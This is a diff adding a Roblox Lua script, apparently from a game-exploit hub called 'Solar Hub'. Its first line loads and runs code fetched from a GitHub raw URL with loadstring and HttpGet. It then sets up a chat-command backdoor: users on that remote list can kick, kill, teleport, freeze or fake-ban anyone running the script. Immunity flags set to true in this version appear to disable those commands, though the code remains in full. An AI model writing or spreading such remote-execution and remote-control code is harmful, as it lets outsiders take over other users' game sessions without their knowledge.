@@ -1,0 +1,222 @@
+local SolarList = loadstring(game:HttpGet('https://raw.githubusercontent.com/rip2point/list/main/list'))() --// grabs the list of whitelisted users
+
+local player = game.Players.LocalPlayer --// state the localplayer
+local hasPremium = true --// does plr have premium?
+local immune = true --// does plr have immunity?
+local adminImmune = true --// does plr have admin immunity?
+local origin --//originpos
+--// notify player func
+  
+function notify(title, description, time)
+game.StarterGui:SetCore("SendNotification", {Title = title, Text = description, Icon = "rbxassetid://14421469856", Duration = time})
+end
+
+--// list-related functions
+function CheckList(requestedUserID, table, callback)
+	for i, v in next, table do
+		if i == requestedUserID then
+			local succ, err = pcall(callback)
+			if not succ then
+				notify("Error!", err, 5)
+			end
+		end
+	end
+end
+
+function isHidden(requestedUserID, table)
+	for i, v in next, table do
+		if i == requestedUserID then
+			return v
+		end
+	end
+end
+
+
+--// tag func
+function TryTag()
+	for _,plr in pairs(game.Players:GetPlayers()) do
+		if plr.Character then
+			CheckList(plr.UserId, SolarList.Premium, function()
+				local hidden = isHidden(plr.UserId, SolarList.Premium)
+				local char = plr.Character
+				if hidden ~= false then
+					local nameTag = char.Head:FindFirstChild("Nametag")
+            		local bannerTag = game.Workspace:FindFirstChild("Banner"..plr.Name)
+            		if not bannerTag then
+                		bannerTag = char:FindFirstChild("Banner"..plr.Name)
+            		end
+            		local texting = bannerTag:FindFirstChild("BillboardGui")
+
+            		if nameTag:IsA("BillboardGui") and texting:IsA("BillboardGui") then
+                		nameTag:FindFirstChild("TextLabel").Text = "[⭐] "..plr.Name
+                		nameTag:FindFirstChild("TextLabel").Shadow.Text = "[⭐] "..plr.Name
+                		texting.Frame.Username.Text = "⭐"..plr.Name.."⭐"
+            		end
+				end
+			end)
+			CheckList(plr.UserId, SolarList.Booster, function()
+				local hidden = isHidden(plr.UserId, SolarList.Booster)
+				local char = plr.Character
+				if hidden ~= false then
+					local nameTag = char.Head:FindFirstChild("Nametag")
+            		local bannerTag = game.Workspace:FindFirstChild("Banner"..plr.Name)
+            		if not bannerTag then
+                		bannerTag = char:FindFirstChild("Banner"..plr.Name)
+            		end
+            		local texting = bannerTag:FindFirstChild("BillboardGui")
+
+            		if nameTag:IsA("BillboardGui") and texting:IsA("BillboardGui") then
+                		nameTag:FindFirstChild("TextLabel").Text = "[🌸] "..plr.Name
+                		nameTag:FindFirstChild("TextLabel").Shadow.Text = "[🌸] "..plr.Name
+                		texting.Frame.Username.Text = "🌸"..plr.Name.."🌸"
+            		end
+				end
+			end)
+			CheckList(plr.UserId, SolarList.Administrator, function()
+				local hidden = isHidden(plr.UserId, SolarList.Administrator)
+				local char = plr.Character
+				if hidden ~= false then
+					local nameTag = char.Head:FindFirstChild("Nametag")
+            		local bannerTag = game.Workspace:FindFirstChild("Banner"..plr.Name)
+            		if not bannerTag then
+                		bannerTag = char:FindFirstChild("Banner"..plr.Name)
+            		end
+
+            		local texting = bannerTag:FindFirstChild("BillboardGui")
+
+            		if nameTag:IsA("BillboardGui") and texting:IsA("BillboardGui") then
+                		nameTag:FindFirstChild("TextLabel").Text = "[👑] "..plr.Name
+                		nameTag:FindFirstChild("TextLabel").Shadow.Text = "[👑] "..plr.Name
+                		texting.Frame.Username.Text = "👑"..plr.Name.."👑"
+            		end
+				end
+			end)
+		end
+	end
+end
+
+--// admin functions
+
+function TryPremium()
+	game.TextChatService.MessageReceived:Connect(function(message)
+		local msg = string.lower(message.Text)
+		local name = tostring(message.TextSource)
+		local userid = message.TextSource.UserId
+		if msg == "!cmds" or msg == "!commands" and hasPremium == true then
+			notify("Solar Hub", "!check, !bring, !unbring, !freeze, !unfreeze, !grave, !ungrave, !kill, !void, !kick, !fakeban", 30)
+		end
+
+		CheckList(userid, SolarList.Premium, function()
+			if immune == false then
+				--// check if plr is ingame
+				local isGame = game.Players.LocalPlayer:FindFirstChild("Values")
+        		if not isGame then
+            		isGame = false
+        		elseif game.PlaceId == 11736628397 then
+            		isGame = false
+        		else
+            		isGame = game.Players.LocalPlayer:FindFirstChild("Values"):FindFirstChild("InGame").Value
+        		end
+				--// in-game cmds:
+
+				if msg == "!check" then
+					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love watching Solar Eclipses!")
+				elseif msg == "!bring" then
+					origin = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+					for i, v in pairs(game.Players:GetPlayers()) do
+						if v.UserId == userid and v.Character then
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+						end
+					end
+				elseif msg == "!unbring" or msg == "!goback" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = origin
+					origin = nil
+				elseif msg == "!freeze" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				elseif msg == "!unfreeze" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				elseif msg == "!grave" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-10,0)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				elseif msg == "!ungrave" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,10,0)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				end
+				--// non-ingame cmds
+				if isGame == false then
+					if msg == "!kick" then
+						game.Players.LocalPlayer:Kick("[SOLAR HUB]: KICKED BY "..name.."!")
+					elseif msg == "!fakeban" then
+						game.Players.LocalPlayer:Kick("PERMA BANNED")
+					elseif msg == "!kill" then
+						game.Players.LocalPlayer.Character.Humanoid.Health = 0
+					elseif msg == "!void" then
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-350,0)
+					end
+				end
+			end
+		end)
+		CheckList(userid, SolarList.Administrator, function()
+			if adminImmune == false then
+				if msg == "!check" then
+					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I love watching Solar Eclipses!")
+				elseif msg == "!bring" then
+					origin = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+					for i, v in pairs(game.Players:GetPlayers()) do
+						if v.UserId == userid and v.Character then
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+						end
+					end
+				elseif msg == "!unbring" or msg == "!goback" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = origin
+					origin = nil
+				elseif msg == "!freeze" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				elseif msg == "!unfreeze" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				elseif msg == "!grave" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-10,0)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				elseif msg == "!ungrave" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,10,0)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				elseif msg == "!kick" then
+					game.Players.LocalPlayer:Kick("[SOLAR HUB]: KICKED BY "..name.."!")
+				elseif msg == "!fakeban" then
+					game.Players.LocalPlayer:Kick("PERMA BANNED")
+				elseif msg == "!kill" then
+					game.Players.LocalPlayer.Character.Humanoid.Health = 0
+				elseif msg == "!void" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-350,0)
+				end
+			end
+		end)
+	end)
+end
+
+--// check if localplayer is whitelisted anywhere
+CheckList(player.UserId, SolarList.Premium, function()
+	notify("Solar Premium", "You are whitelisted with Solar Premium! For list of commands, type !commands in chat.", 60)
+	immune = true
+	hasPremium = true
+end)
+CheckList(player.UserId, SolarList.Immunity, function()
+	notify("Solar Immunity", "You are whitelisted with Solar Immunity! You are fully immune to Solar Premium commands.", 60)
+	immune = true
+end)
+CheckList(player.UserId, SolarList.Booster, function()
+	notify("Solar Hub", "Thanks for boosting! You are fully immune to Solar Premium commands.", 60)
+	immune = true
+end)
+CheckList(player.UserId, SolarList.Administrator, function()
+	hasPremium = true
+	adminImmune = true
+	immune = true
+	notify("Solar Administrator", "You are whitelisted with Solar Administrator! For list of commands, type !commands in chat.", 60)
+end)
+
+
+TryPremium()
+while task.wait(3) do
+	pcall(TryTag)
+end
